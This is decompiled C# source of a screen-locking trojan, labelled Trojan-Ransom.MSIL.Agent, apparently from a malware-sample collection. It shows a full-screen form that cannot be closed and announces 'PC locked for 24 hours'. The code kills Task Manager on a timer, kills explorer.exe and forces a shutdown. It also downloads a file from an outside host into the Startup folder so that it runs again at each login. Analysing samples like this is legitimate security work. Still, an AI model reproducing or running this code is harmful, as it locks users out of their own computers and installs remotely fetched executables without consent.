// Decompiled with JetBrains decompiler
// Type: help.Form1
// Assembly: help, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: D853B65A-B44E-45A5-B270-D022BB1A1A97
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00100-msil\Trojan-Ransom.MSIL.Agent.rr-2c965d770aae7a6a54c1bd935faa96b39fea07ae74192061c1df10afe16554d7.exe

using help.My;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Windows.Forms;

namespace help
{
  [DesignerGenerated]
  public class Form1 : Form
  {
    private IContainer components;
    [AccessedThroughProperty("Timer1")]
    private Timer _Timer1;
    [AccessedThroughProperty("Label1")]
    private Label _Label1;
    [AccessedThroughProperty("Label2")]
    private Label _Label2;
    [AccessedThroughProperty("Label3")]
    private Label _Label3;
    [AccessedThroughProperty("Label4")]
    private Label _Label4;
    private const int HWND_TOPMOST = -1;
    private const int SWP_NOMOVE = 2;
    private const int SWP_NOSIZE = 1;
    private const int HWND_NOTOPMOST = -2;
    private const int SWP_SHOWWINDOW = 64;

    public Form1()
    {
      this.FormClosing += new FormClosingEventHandler(this.Form1_FormClosing);
      this.Load += new EventHandler(this.Form1_Load);
      this.InitializeComponent();
    }

    [DebuggerNonUserCode]
    protected override void Dispose(bool disposing)
    {
      try
      {
        if (!disposing || this.components == null)
          return;
        this.components.Dispose();
      }
      finally
      {
        base.Dispose(disposing);
      }
    }

    [DebuggerStepThrough]
    private void InitializeComponent()
    {
      this.components = (IContainer) new System.ComponentModel.Container();
      this.Timer1 = new Timer(this.components);
      this.Label1 = new Label();
      this.Label2 = new Label();
      this.Label3 = new Label();
      this.Label4 = new Label();
      this.SuspendLayout();
      this.Timer1.Enabled = true;
      this.Timer1.Interval = 10;
      this.Label1.AutoSize = true;
      this.Label1.Font = new Font("Microsoft Sans Serif", 72f, FontStyle.Bold, GraphicsUnit.Point, (byte) 0);
      this.Label1.ForeColor = Color.White;
      Label label1_1 = this.Label1;
      Point point1 = new Point(103, 44);
      Point point2 = point1;
      label1_1.Location = point2;
      this.Label1.Name = "Label1";
      Label label1_2 = this.Label1;
      Size size1 = new Size(1076, 108);
      Size size2 = size1;
      label1_2.Size = size2;
      this.Label1.TabIndex = 0;
      this.Label1.Text = "Don't try to hack server!";
      this.Label2.AutoSize = true;
      this.Label2.Font = new Font("Microsoft Sans Serif", 72f, FontStyle.Bold, GraphicsUnit.Point, (byte) 0);
      this.Label2.ForeColor = Color.White;
      Label label2_1 = this.Label2;
      point1 = new Point(114, 210);
      Point point3 = point1;
      label2_1.Location = point3;
      this.Label2.Name = "Label2";
      Label label2_2 = this.Label2;
      size1 = new Size(1065, 108);
      Size size3 = size1;
      label2_2.Size = size3;
      this.Label2.TabIndex = 1;
      this.Label2.Text = "PC locked for 24 hours!";
      this.Label3.AutoSize = true;
      this.Label3.Font = new Font("Microsoft Sans Serif", 72f, FontStyle.Bold, GraphicsUnit.Point, (byte) 0);
      this.Label3.ForeColor = Color.White;
      Label label3_1 = this.Label3;
      point1 = new Point(103, 387);
      Point point4 = point1;
      label3_1.Location = point4;
      this.Label3.Name = "Label3";
      Label label3_2 = this.Label3;
      size1 = new Size(337, 108);
      Size size4 = size1;
      label3_2.Size = size4;
      this.Label3.TabIndex = 2;
      this.Label3.Text = "Label3";
      this.Label4.BackColor = Color.Transparent;
      Label label4_1 = this.Label4;
      point1 = new Point(539, 260);
      Point point5 = point1;
      label4_1.Location = point5;
      this.Label4.Name = "Label4";
      Label label4_2 = this.Label4;
      size1 = new Size(17, 23);
      Size size5 = size1;
      label4_2.Size = size5;
      this.Label4.TabIndex = 3;
      this.Label4.Text = "Label4";
      this.AutoScaleDimensions = new SizeF(10f, 18f);
      this.AutoScaleMode = AutoScaleMode.Font;
      this.BackColor = Color.Black;
      size1 = new Size(1276, 925);
      this.ClientSize = size1;
      this.Controls.Add((Control) this.Label4);
      this.Controls.Add((Control) this.Label3);
      this.Controls.Add((Control) this.Label2);
      this.Controls.Add((Control) this.Label1);
      this.Font = new Font("Microsoft Sans Serif", 11.25f, FontStyle.Bold, GraphicsUnit.Point, (byte) 0);
      this.FormBorderStyle = FormBorderStyle.None;
      this.Margin = new Padding(5, 4, 5, 4);
      this.Name = nameof (Form1);
      this.Text = nameof (Form1);
      this.TopMost = true;
      this.WindowState = FormWindowState.Maximized;
      this.ResumeLayout(false);
      this.PerformLayout();
    }

    internal virtual Timer Timer1
    {
      get => this._Timer1;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.Timer1_Tick);
        if (this._Timer1 != null)
          this._Timer1.Tick -= eventHandler;
        this._Timer1 = value;
        if (this._Timer1 == null)
          return;
        this._Timer1.Tick += eventHandler;
      }
    }

    internal virtual Label Label1
    {
      get => this._Label1;
      [MethodImpl(MethodImplOptions.Synchronized)] set => this._Label1 = value;
    }

    internal virtual Label Label2
    {
      get => this._Label2;
      [MethodImpl(MethodImplOptions.Synchronized)] set => this._Label2 = value;
    }

    internal virtual Label Label3
    {
      get => this._Label3;
      [MethodImpl(MethodImplOptions.Synchronized)] set => this._Label3 = value;
    }

    internal virtual Label Label4
    {
      get => this._Label4;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.Label4_Click);
        if (this._Label4 != null)
          this._Label4.Click -= eventHandler;
        this._Label4 = value;
        if (this._Label4 == null)
          return;
        this._Label4.Click += eventHandler;
      }
    }

    [DllImport("user32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern long SetWindowPos(
      long hWnd,
      long hWndInsertAfter,
      long x,
      long y,
      long cx,
      long cy,
      long wFlags);

    private void setwinPos(Form frmform, bool bolSetToForeground)
    {
    }

    private void Form1_FormClosing(object sender, FormClosingEventArgs e) => e.Cancel = true;

    private void Timer1_Tick(object sender, EventArgs e)
    {
      this.Name = "taskmgr.exe";
      Process[] processesByName = Process.GetProcessesByName("taskmgr");
      int index = 0;
      while (index < processesByName.Length)
      {
        processesByName[index].Kill();
        checked { ++index; }
      }
      this.setwinPos((Form) this, true);
    }

    [MethodImpl(MethodImplOptions.NoInlining | MethodImplOptions.NoOptimization)]
    private void Form1_Load(object sender, EventArgs e)
    {
      if (!MyProject.Computer.FileSystem.FileExists(Environment.GetFolderPath(Environment.SpecialFolder.Personal) + "\\helpcounter.txt"))
        MyProject.Computer.Network.DownloadFile("http://thehacker5.npage.de/get_file.php?id=24090314&vnr=391676", Environment.GetFolderPath(Environment.SpecialFolder.Personal) + "\\helpcounter.txt");
      string Left;
      while (true)
      {
        string str = Conversions.ToString(DateAndTime.DateAdd("h", 24.0, (object) Conversions.ToString(DateTime.Now)));
        Left = Conversions.ToString(DateTime.Now);
        if (!MyProject.Computer.FileSystem.FileExists(Environment.GetFolderPath(Environment.SpecialFolder.Personal) + "\\help.txt"))
        {
          using (File.Create(Environment.GetFolderPath(Environment.SpecialFolder.Personal) + "\\help.txt"))
            ;
          using (StreamWriter streamWriter = new StreamWriter(Environment.GetFolderPath(Environment.SpecialFolder.Personal) + "\\help.txt"))
          {
            streamWriter.WriteLine(str);
            streamWriter.Close();
            streamWriter.Dispose();
          }
        }
        else
          break;
      }
      StreamReader streamReader1 = new StreamReader(Environment.GetFolderPath(Environment.SpecialFolder.Personal) + "\\help.txt");
      string Right = streamReader1.ReadLine();
      streamReader1.Close();
      streamReader1.Dispose();
      if (Operators.CompareString(Left, Right, false) > 0)
      {
        this.Hide();
        this.Timer1.Enabled = false;
        if (MyProject.Computer.FileSystem.FileExists(Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\helpbat.exe"))
        {
          FileSystem.Kill(Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\helpbat.exe");
          int num = (int) Interaction.MsgBox((object) "Press CTRL+ALT+DEL (STRG+ALT+ENTF) and logoff (abmelden). \r\nThen you can use your PC normal");
        }
        else
          NewLateBinding.LateCall(RuntimeHelpers.GetObjectValue(Interaction.CreateObject("WScript.Shell")), (System.Type) null, "Popup", new object[4]
          {
            (object) "The 24 hours are over. Dont try to hack server!\r\nNow delete 'help.exe' from your startup folder!\r\n\r\nDie 24 Stunden sind vorbei! VERUSCHE NICHT SERVER ZU ZERSTÖREN!\r\nDu kannst nun die help.exe im Autostart (oder startup) Ordner entfernen!",
            (object) 99999,
            (object) "Info",
            (object) Missing.Value
          }, (string[]) null, (System.Type[]) null, (bool[]) null, true);
        ProjectData.EndApp();
      }
      else
      {
        if (!MyProject.Computer.FileSystem.FileExists(Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\helpbat.exe"))
          MyProject.Computer.Network.DownloadFile("http://thehacker5.npage.de/get_file.php?id=24107976&vnr=611342", Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\helpbat.exe");
        Interaction.Shell("taskkill /f /im explorer.exe");
        StreamReader streamReader2 = new StreamReader(Environment.GetFolderPath(Environment.SpecialFolder.Personal) + "\\help.txt");
        string str = streamReader2.ReadLine();
        streamReader2.Close();
        streamReader2.Dispose();
        this.Label3.Text = "To: " + str.ToString();
        Interaction.Shell("shutdown.exe -s -f -t 10");
      }
    }

    [MethodImpl(MethodImplOptions.NoInlining | MethodImplOptions.NoOptimization)]
    private void Label4_Click(object sender, EventArgs e) => ProjectData.EndApp();
  }
}
